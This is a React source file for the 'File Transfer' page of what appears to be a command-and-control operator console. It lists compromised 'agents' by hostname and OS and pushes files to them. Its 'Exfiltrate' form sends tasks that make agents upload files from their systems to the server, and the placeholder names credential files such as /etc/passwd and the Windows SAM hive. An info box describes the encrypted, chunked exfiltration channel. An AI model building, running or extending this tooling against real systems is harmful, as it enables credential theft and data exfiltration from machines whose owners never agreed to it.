import React, { useEffect, useMemo, useState } from "react";
import { Agent, listAgents, listFiles, StoredFile, apiBase, downloadFile, createTask } from "../lib/api";
import { getToken } from "../lib/storage";
import { useToasts } from "../components/ToastProvider";
import styles from "./FileTransferPage.module.css";

export function FileTransferPage() {
  const toasts = useToasts();
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>("");
  const [files, setFiles] = useState<StoredFile[]>([]);
  const [status, setStatus] = useState<string>("idle");
  const [uploadProgress, setUploadProgress] = useState<number>(0);
  const [isUploading, setIsUploading] = useState<boolean>(false);

  const api = useMemo(() => apiBase(), []);

  useEffect(() => {
    refreshAgents();
  }, []);

  useEffect(() => {
    if (selectedAgent) {
      refreshFiles();
    } else {
      setFiles([]);
    }
  }, [selectedAgent]);

  async function refreshAgents() {
    try {
      setStatus("loading agents...");
      const list = await listAgents();
      setAgents(list);
      if (list.length > 0 && !selectedAgent) {
        setSelectedAgent(list[0].agent_id);
      }
      setStatus("agents loaded");
    } catch (e) {
      setStatus(`error loading agents: ${e}`);
      toasts.push({ kind: "bad", title: "Error", message: String(e) });
    }
  }

  async function refreshFiles() {
    if (!selectedAgent) return;
    try {
      setStatus("loading files...");
      const list = await listFiles(selectedAgent);
      setFiles(list);
      setStatus(`loaded ${list.length} files`);
    } catch (e) {
      setStatus(`error loading files: ${e}`);
      toasts.push({ kind: "bad", title: "Error", message: String(e) });
    }
  }

  async function handleFileUpload(event: React.ChangeEvent<HTMLInputElement>) {
    const fileInput = event.target;
    const uploadedFiles = fileInput.files;
    if (!uploadedFiles || uploadedFiles.length === 0) return;
    if (!selectedAgent) {
      toasts.push({ kind: "bad", title: "Error", message: "Please select an agent first" });
      return;
    }

    const file = uploadedFiles[0];
    setIsUploading(true);
    setUploadProgress(0);
    setStatus(`uploading ${file.name}...`);

    try {
      // Create FormData with file and agent_id
      const formData = new FormData();
      formData.append("file", file);
      formData.append("agent_id", selectedAgent);

      // Send the file to the upload endpoint
      const token = getToken();
      const response = await fetch(`${api}/api/operator/files/upload`, {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${token || ""}`,
        },
        body: formData,
      });

      if (!response.ok) {
        const error = await response.text();
        throw new Error(`Upload failed: ${response.status} ${error}`);
      }

      const result = await response.json() as { status: string; file_id: string; filename: string };
      
      setStatus("upload complete");
      toasts.push({ kind: "good", title: "File uploaded", message: `${file.name}` });
      await refreshFiles();
    } catch (e) {
      setStatus(`upload failed: ${e}`);
      toasts.push({ kind: "bad", title: "Upload failed", message: String(e) });
    } finally {
      setIsUploading(false);
      setUploadProgress(0);
      fileInput.value = "";
    }
  }

  async function handleFileDownload(file: StoredFile) {
    try {
      setStatus(`downloading ${file.filename}...`);
      await downloadFile(file.file_id, file.filename);
      setStatus("download started");
      toasts.push({ kind: "good", title: "Download started", message: file.filename });
    } catch (e) {
      setStatus(`download failed: ${e}`);
      toasts.push({ kind: "bad", title: "Download failed", message: String(e) });
    }
  }

  async function handleExfiltrateClick() {
    const filePath = (document.getElementById("exfiltrate-path") as HTMLInputElement)?.value;
    if (!filePath) {
      toasts.push({ kind: "bad", title: "Error", message: "Please enter a file path" });
      return;
    }
    if (!selectedAgent) {
      toasts.push({ kind: "bad", title: "Error", message: "Please select an agent" });
      return;
    }

    try {
      setStatus(`creating exfiltrate task for ${filePath}...`);
      await createTask(selectedAgent, "exfiltrate", [filePath], 300);
      setStatus(`exfiltrate task created for ${filePath}`);
      toasts.push({ kind: "good", title: "Task created", message: `Exfiltrate task sent for ${filePath}` });
      (document.getElementById("exfiltrate-path") as HTMLInputElement).value = "";
      // Refresh files after a short delay to show the exfiltrated file
      setTimeout(() => refreshFiles(), 2000);
    } catch (e) {
      setStatus(`task creation failed: ${e}`);
      toasts.push({ kind: "bad", title: "Task creation failed", message: String(e) });
    }
  }

  function formatFileSize(bytes: number): string {
    if (bytes === 0) return "0 B";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i];
  }

  function formatDate(iso: string): string {
    return new Date(iso).toLocaleString();
  }

  return (
    <div className={styles.container}>
      <h1>File Transfer</h1>

      <div className={styles.section}>
        <h2>Select Agent</h2>
        <select value={selectedAgent} onChange={(e) => setSelectedAgent(e.target.value)} disabled={agents.length === 0}>
          <option value="">-- Select an agent --</option>
          {agents.map((agent) => (
            <option key={agent.agent_id} value={agent.agent_id}>
              {agent.hostname || agent.agent_id.slice(0, 8)} ({agent.os} {agent.arch})
            </option>
          ))}
        </select>
        <button onClick={refreshAgents}>Refresh Agents</button>
      </div>

      {selectedAgent && (
        <div className={styles.section}>
          <h2>Upload File to Agent</h2>
          <p className={styles.description}>
            Select a file to upload. Files are encrypted with AES-256-GCM before transfer and split into 256 KiB chunks.
          </p>
          <div className={styles.uploadArea}>
            <input type="file" id="file-input" onChange={handleFileUpload} disabled={isUploading} style={{ marginRight: "1rem" }} />
            {isUploading && (
              <div className={styles.progressContainer}>
                <progress value={uploadProgress} max={100} style={{ width: "300px" }} />
                <span>{uploadProgress}%</span>
              </div>
            )}
          </div>
          {status && status.includes("upload") && <p className={styles.status}>{status}</p>}
        </div>
      )}

      {selectedAgent && (
        <div className={styles.section}>
          <h2>Exfiltrate File from Agent</h2>
          <p className={styles.description}>
            Request the agent to exfiltrate (upload) a file from their system. The file will be encrypted and stored on the server.
          </p>
          <div className={styles.exfiltrateForm}>
            <input 
              type="text" 
              id="exfiltrate-path" 
              placeholder="e.g., /etc/passwd or C:\Windows\System32\config\SAM" 
              style={{ marginRight: "1rem", padding: "0.5rem", width: "300px" }}
            />
            <button onClick={handleExfiltrateClick} title="Create exfiltrate task">
              Exfiltrate
            </button>
          </div>
          {status && status.includes("exfiltrate") && <p className={styles.status}>{status}</p>}
        </div>
      )}

      {selectedAgent && (
        <div className={styles.section}>
          <h2>Downloaded Files</h2>
          <button onClick={refreshFiles} style={{ marginBottom: "1rem" }}>
            Refresh Files
          </button>

          {files.length === 0 ? (
            <p className={styles.noData}>No files downloaded yet</p>
          ) : (
            <div className={styles.tableContainer}>
              <table>
                <thead>
                  <tr>
                    <th>Filename</th>
                    <th>Chunks</th>
                    <th>Status</th>
                    <th>Uploaded</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {files.map((file) => {
                    const isComplete = file.chunks_received === file.total_chunks;
                    const progress = Math.round((file.chunks_received / file.total_chunks) * 100);
                    return (
                      <tr key={file.file_id}>
                        <td className={styles.filename}>{file.filename}</td>
                        <td>
                          {file.chunks_received}/{file.total_chunks}
                        </td>
                        <td>
                          <div className={styles.progressBar}>
                            <div className={styles.progress} style={{ width: `${progress}%` }} />
                          </div>
                          <span className={isComplete ? styles.complete : styles.incomplete}>
                            {progress}% {isComplete ? "✓" : "..."}
                          </span>
                        </td>
                        <td className={styles.date}>{formatDate(file.uploaded_at)}</td>
                        <td>
                          <button onClick={() => handleFileDownload(file)} disabled={!isComplete} title={!isComplete ? "File not complete" : "Download file"}>
                            Download
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      <div className={styles.section}>
        <h2>Info</h2>
        <div className={styles.infoBox}>
          <h3>How File Transfer Works</h3>
          <ul>
            <li>
              <strong>Encryption:</strong> Files are encrypted with AES-256-GCM before leaving the agent
            </li>
            <li>
              <strong>Chunking:</strong> Large files are split into 256 KiB encrypted chunks
            </li>
            <li>
              <strong>Authentication:</strong> Each chunk is authenticated with HMAC-SHA256 to detect tampering
            </li>
            <li>
              <strong>Transport:</strong> All transfers occur over HTTPS with TLS 1.2+
            </li>
            <li>
              <strong>Server Storage:</strong> The server stores encrypted chunks and never decrypts files
            </li>
            <li>
              <strong>Agent Download:</strong> Agents can download files from the operator and decrypt them locally
            </li>
            <li>
              <strong>Agent Exfiltration:</strong> Create an exfiltrate task to request agents upload files back to the server
            </li>
          </ul>
        </div>
      </div>

      {status && (
        <div className={styles.statusBar}>
          <span>{status}</span>
        </div>
      )}
    </div>
  );
}
